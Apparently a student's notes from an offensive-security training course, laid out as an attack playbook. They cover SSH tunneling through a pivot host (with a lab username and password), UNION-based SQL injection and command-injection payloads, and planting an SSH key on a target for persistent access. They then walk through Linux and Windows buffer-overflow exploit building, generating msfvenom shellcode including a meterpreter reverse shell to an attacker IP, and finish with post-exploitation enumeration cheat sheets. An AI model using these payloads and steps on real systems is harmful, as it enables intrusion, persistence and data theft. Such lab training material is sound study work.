

refresh on tunneling
```
ssh demo1@10.50.12.21 -L1111:10.208.50.61:80
Stack Number	Username	Password	jump
15 	MAWI-M-503 	EkXBJpSgYSJm 	10.50.16.1

ssh -MS /tmp/jump demo1@10.50.12.21
ssh -S /tmp/jump jump -O forward -D 9050
ssh -S /tmp/jump jump -O forward -L1111:10.50.12.21:22 -L1112:20.50.12.21:80
ssh -S /tmp/jump jump -O cancel -L1111:10.50.12.21:22 -L1112:20.50.12.21:80
```



enumeration
```
for i in {1..255}; do (ping -c 1 10.50.12.$i | grep 'bytes from' &); done
nmap -p 53 --script dns* 10.50.12.22-24
nmap -p 80 --script http-enum 10.50.12.22-24
```


sql
```
input bypass: ../../../../../etc/passwd | ../../../../../etc/hosts
input bypass: ; whoami



POST METHOD (input box)
how to check for vulnverable input field:
Audi 'OR 1='1

find number of colums were working with
Audi 'Union select 1,2,3,4,5 #

Audi' UNION SELECT 1,2,3,4,5 FROM information_schema.tables

golden rule
Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #

molding the statement to get the information we want example
Audi' UNION SELECT tireid,2,size,cost,5 FROM session.Tires #




GET METHOD (URL MANIPULATION)

<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_name,3 FROM information_schema.tables   <!—Displays all table names in the database -->
<URL>/uniondemo.php?Selection=2 UNION SELECT 1,table_schema,table_name FROM information_schema.tables   <!—Displays all databases and the names of their tables --> 
<URL>/uniondemo.php?Selection=2 UNION SELECT table_name,1,column_name FROM information_schema.columns   <!—Display all tables and the columns they contain -->
<URL>/uniondemo.php?Selection=2 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns #   <!-- "Golden" statement -->
<URL>/uniondemo.php?Selection=2 UNION SELECT null,name,color FROM car   <!-- Using information pulled from the Golden Statement to query a different table -->





UNION SELECT table_schema,permission_level,null FROM users WHERE permission_level='banned' #




```


ssh upload / key gen
```
# ssh key gen ( very important )
cat /etc/passwd .. look for /bash

-- generate our key # run all on lin-ops
ssh-keygen -t rsa -b 4096 # enter for default option
No Passphrase

cat /home/student/.ssh/id_rsa.pub


# from remote machine / target - command injection
# make dir and verify
; mkdir /var/www/.ssh
; ls -la /var/www

#upload key and verify - still on target
; echo "" > /var/www/.ssh/authirized_keys #paste whole key into echo "<key>"
; cat /var/www/.ssh/authorized_keys

now 
ssh -S /tmp/demo demo -O cancel -L42071:10.208.50.42:80

ssh -S /tmp/demo demo -O forward -L42071:10.208.50.42:22
ssh -MS /tmp/t1 www-data@127.0.0.1 -p 42071 -FN 2>/dev/null
# specify key using -i
ssh -MS /tmp/t1 -i <key> www-data@127.00.1 -p 52071 -fN 2>/dev/null
ssh -S /tmp/t1 t1 www-data@127.0.0.1

to verify port works: nc 127.0.0.1 42071


**how to connect to web exploitation**
10.100.28.40
80 // 4444
/home/student/.ssh/id_rsa.pub


ssh -MS /tmp/jmp student@10.50.16.1
ssh -S /tmp/jmp student@10.50.16.1
ssh -S /tmp/jmp jmp -O forward -L 50000:10.100.28.40:80
ssh -S /tmp/jmp jmp -O forward -L 51000:10.100.28.40:4444
ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000

ssh -MS /tmp/jmp student@pivot
ssh -S /tmp/jmp student@pivot
ssh -S /tmp/jmp jmp -O forward -L 50000:target:80
ssh -S /tmp/jmp jmp -O forward -L 51000:target:4444
ssh -S tmp/jmp -i /home/student/.ssh/id_rsa.pub billybob@127.0.0.1 -p 51000

```

exploit dev
```
Determine Vulnerable Code
What are functions?

How can a function be vulnerable?

C Code Example:

gets() -> fgets()
strcpy() -> strncpy()
strcat() -> strncat()
sprintf() -> snprintf()






A `stack canary` (or stack cookie) is a random, hidden value placed on the program stack during function execution, located just before the return pointer. It acts as a tripwire to detect stack buffer overflows; if the value changes (overwritten), the program crashes to prevent exploitation. 









gunny notes
// download func..

// static analysis
// strings func
// file func
from this we know it wants a string, is an ELF 32 bit

// behavioral analysis
// chmod u+x file
// run it
// command substitution

 // determine what its expecting: some form of user input 
 // assigning some form of param. to the file input
 // ./func $(echo "12345")
 // nothing happens: its still asking for a string
 // user input:
 // ./func <<<$(echo "12345")
 // pushes the string into the input

// dynamic analysis
//fuzzing
 // ./func <<<$(echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")
 // looking for seg fault

// gdb ./func
// 'shell' to exit 'exit' will pop us back into gdb
// 'info functions' shows all functions in the program
// 'run' will run the program in gdp
// 'ctrl + c' to terminate
// run 'info functions' after this for more output

// disassembly (still in gdb) # looks for vulnerabilities 
// green -> addition part of the program being run
// ignore anything with __ or x86 -> rabbit hole
 //pdisass main
// pdisass <new function call>
// example: pdisass getuserinput
// you should see red -> vulnerable function
// yellow -> address allocation within the stack


// back in GDB, run <<<#(python ./func.py) 
// you will be looking for 'EIP' when the file returns a segfault

// go to wiremask.eu/tools/buffer-overflow-pattern-genetator/
// change from a * 100 in the python script to the value from ^^^^^
// run again

now find the EIP again, exclude the 0x

put the rest of the EIP into the `register value` under `find the offset` in wiremask
it will return an offset of 62 for example

go back into the script and change the offset = "A" * 62

now add a variable to the python script called 'eip'
eip = "B" * 4
( 4 is how many bytes eip took up )
// `\x59` `\x3b` `\xde` `\xf7` .. there is 4 bytes

include into the print
print (offset + eip)

run the script again within the GDB and the EIP should change

now.. getting a little lost ..


find the JMP ESP location:
get out of the GDB using `shell` and in the terminal write: `env - gdb ./func'

run within ^^^^^^ :
unset env LINES
unset env COLUMNS
show env // verify nothing is there

// this is to clean the environment

run: 
`run` ( use ctrl c ) // run just runs it ; use this
OR 
`start` // start allows breakpoints

run: `info proc map`
look for HEAP && STACK
when you see the heap, go to the next memory access // DIRECTLY AFTER (down one) (FIRST COLUMN)
when you see the stack, go the last memory access (within the same line) (SECOND COLUMN)
sometimes you wont see both the heap and the stack so just type `step` until you see it, if you use `run` you shouldnt worry about this

now we find the jump... using `find /b <address (heap/stack)

find /b heap addr, stack addr, 0xff, 0xe4
// will blurt out a list, copy them all or just the first FIVE and document
convert them into little_endian (flip the text pretty much (invert))
example: 0xf7de3b59
f7 de 3b 59 > \x59\x3b\xde\xf7


put into the eip variable in the func.py file
eip = "\x59\x3b\xde\xf7"
then add a nop variable
nop = "\x90" * 15

make sure to print all of it (offset + eip + nop)


// now make our payload
msfvenom -p linux/x86/exec CMD=whoami -b "\x00\xfe\x20\x0a\xff" -f python
bad bytes chars do not change ( after the -b )




copy the output into the python script (ALL OF IT)
run again `./func <<<$(python ./func.py)
```


windows buffer over flow
```

windows buffer overflow

turn anti virus off

static analysis
 // run powershell as admin, cd to dir of vuln server file
 // strings.exe vulnserver.exe
 // GUI > Properties


havioral analysis
 // RUN IT
 // netstat -anob
 // get-process | findstr /i vuln
 
dynamic analysis
 // open immunity debugger as admin.
 // run vulnserver and attach it
 // eip top right
 // click rewind, top left; click play, top left
 // verify windows defender is off


go to linux box
  // i named by file winbuff.py
 
<img width="588" height="585" alt="{B801876B-6B59-416B-8B9F-E17F5B754D29}" src="https://github.com/user-attachments/assets/59a2e37e-6bf3-4ef8-afe3-e445eb4477e4" />

 // changed `buf` to "TRUN /.:/"
 start our fuzzing
 // added a variable: `buf += "A" * 5000
 // rewind immunity again and press play

when ran our EIP changes to 41414141
go to wiremask again , change length to 5000 , copy the pattern into the `buf += "pattern"` without the multiplier

// rewind immunity again and press play

<img width="783" height="293" alt="{BC996539-0C83-4C40-B1D8-5CFD88B17BFE}" src="https://github.com/user-attachments/assets/789d4aaf-1a05-4951-acac-acc488cea2f5" />


// run the script again, get new EIP from immunity
// copy the NEW EIP into the registry offset on wiremask, find offset
// add the 4 B's into a buf += "b" * 4
<img width="768" height="291" alt="{A090398B-3D82-4FA2-8193-F721AB1F191A}" src="https://github.com/user-attachments/assets/5729d66b-e4c2-467e-aff8-c1a37afe7b87" />

ctrl + k in nano to delete a line


run and the EIP should be 42424242 - > you successfuly overwrote

time to find jump ESP location
.. bottom left of the screen theres a search box.. type in: `!mona modules`
this will search for unprotected dll's
<img width="1037" height="168" alt="{6CBF2C8E-D900-4236-A6B1-B897E3C6D266}" src="https://github.com/user-attachments/assets/99de257d-b3d3-443c-9255-c3a884cff5a9" />


looking for ALL FALSE. -> essfunc.dll

search for jump esp locations within the dll you located
the next mona command is `!mona jmp -r esp -m "essfunc.dll"`


<img width="1036" height="101" alt="image" src="https://github.com/user-attachments/assets/8ba1f069-8fd3-473e-9a55-511a41f27609" />

copy the first couple of them down and convert them

converting big endian to little endian:
space them out
62 50 11 af
add to buff variable
buf += "\xaf\x11\x50\x62"

add a NOP sled to the buf aswell: `buf += "\x90" * 10

should look like this:
<img width="689" height="451" alt="{79A88CFE-DE27-4589-9015-454B317AEA1B}" src="https://github.com/user-attachments/assets/6fecdfb3-4f51-4f69-a436-b5d178a0526b" />


now lets make our payload
msfvenom -p windows/meterpreter/reverse_tcp lhost=linux-ops lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python
msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.143.86 lport=4444 -b "\x00\xfe\x20\x0a\xff" -f python

<img width="789" height="631" alt="{73FF8C86-1B4C-4A30-A837-0DA3322CBB09}" src="https://github.com/user-attachments/assets/273b7334-0ef3-4b3c-acd6-ee23433c4c29" />

copy the whole payload except the first line, that will reset the `buf` variable

<img width="620" height="552" alt="{7C95339D-CBA3-4F16-91AC-F7BF62383EDF}" src="https://github.com/user-attachments/assets/0dd75c80-dd5c-464e-a26c-c644cb53155d" />
<img width="620" height="357" alt="{FD81A650-DF04-4343-A615-F6341FD27D1A}" src="https://github.com/user-attachments/assets/0ff5945d-4d04-482d-840e-642896e171bc" />


setup your msfconsole to catch the reverse shell
commands:
 msfconsole
 use multi/handler
 show options
 set payload windows/meterpreter/reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 4444
 exploit
 
 <img width="767" height="617" alt="{147C4C05-88C9-4E74-A767-65E6BA5A8E23}" src="https://github.com/user-attachments/assets/bf569128-7e40-41a6-8201-33cbf0b2f54c" />

go back to windows, rewind, press play, check security settings

run the python script on linux, check msfconsole
<img width="780" height="124" alt="{9F865A9E-3937-4E69-AA46-CBA9E6DE12F9}" src="https://github.com/user-attachments/assets/3c6d9abe-d504-45ff-803f-63c2ec662f9b" />

once in type `shell`

```

post ex cheatsheet
```
HOST ENUMERATION LINUX

(Focus on information gathering for exploiting later)

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/?redirect


What are we trying to accomplish doing host enumeration?
    • Gathering information about the environment in order  to escalate privileges, gather more information about the network, learn the habits of an admin is he a baddie.. There was times during ops you had to actually fix their own network for them in order to complete a task

When checking directories remember to always use ls -la. You never know what can be hiding.



Linux Commands
date & time	        knowing date and time can help correlate logs and identify target's time zone 
whoami	            who we are logged in as
id		            permissions group ( do we have root permissions)
groups 	            see what groups we are in (are we in the sudoers)
sudo -l             do we have any binaries that execute with higher privs  
cat /etc/passwd	    user information
cat /etc/shadow     user information (need privileged access)
w                   who is logged in, terminal and what they are doing (tty are direct connections to the pc.. So pts are ssh or telnet connections)
last                information about users that logged in (user habits, might need to avoid times)
uptime              how long has the machine been up (would this make for a good pivot)
hostname            name of machine
uname -a            kernel information architecture
cat /etc/*rel*      OS version information


Networking Information

ip addr                 info about the network interfaces (IPs, subnets, etc.)
ifconfig -a             info about the network interfaces (IPs, subnets, etc.) (Depricated)
cat /etc/hosts          translates hostnames or domain names to ip addresses ( could see a name to another box, might point a target of interest Windows Server )
cat /etc/resolv.conf    configure dns name servers 
ss -antp                displays TCP socket information (listening ports and established connections along with process associated with the socket)(-p needs root privs)
netstat -antp           displays TCP socket information (listening ports and established connections along with process associated with the socket)(-p needs root privs)
netstat -anup           displays UDP socket information
netstat -rn             prints routing table
arp -an                 prints arp table


Process Information
ps -ef                                  prints all processes in full-format listing
ps -auxf 	                            prints all processes in and some other info in different format
lsof -p [pid] 	                        list of open files opened by the process identified by its pid
ls -al /proc/[pid]                      list directrory of a specific pid
service --status-all    	            shows all services and if they are running or not 
systemctl list-units --type=service     another way to list all services depending on type of linux system



Logging
cat /etc/rsyslog.conf   default rsyslog config file, check rules and for remote logging 
/etc/rsyslog.d 		    directory where config files are kept we want to check those also.
/var/log		        default location for linux system logs


Crontabs
Why might we want to check Crontabs? What could we take advantage of?
Crontabs are owned by respective users so you will not be able to see other users crontabs.
Multiple ways and places to look for cron jobs/scripts.
/var/spool/cron/crontabs
/etc/cron.d
ls -la /etc/cron*
cat /etc/cron*  crontab
sudo crontab -u student -l



Finding files and locations to check
find usaga examples:
find / -name password* 2>/dev/null      find any file starting with the word password 
find / -iname *test* 2>/dev/null        find any file with "test" somewhere in its name, ignoring capitalization
find / -type f -name *.txt              find all .txt files        
find / -type f -name ".*"               find all hidden files
find / -type d -name ".*"               find all hidden directories



/tmp		check tmp folders (world writable)
/home	 	check home folders for users
/etc        default location for config files








HOST ENUMERATION WINDOWS

General Information

Date /t
Time /t
Hostname
Whoami
systeminfo

User Information
Net user
Net localgroup
Net localgroup administrators
Net use ( if any shares are mapped)


Network Information
Ipconfig /all
Ipconfig /displaydns
Route print
Netstat -ant
Netstat -anob ( need to be admin)


Interesting Locations
Explorer - view - hidden items ( turn on show hidden items )
Check users documents,downloads,desktops
Dir c:\windows\prefetch ( admin ) = see what executables have been ran
Dir /a:h
dir /o:d /t:w c:\windows\system32
dir /o:d /t:w c:\windows\system32\winevt\logs
dir /o:d /t:w c:\windows\temp
reg query hklm\software\microsoft\windows\currentversion\run /s   (don’t forget about hkcu) and runonce


Process and Services 
Tasklist /v
Tasklist /svc
tasklist /svc | findstr /i "PID"

Services.msc ( gui )
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a
Sc query <service name>

Schtasks
Task sch ( gui )
schtasks /query /fo LIST /v
schtasks /query
```
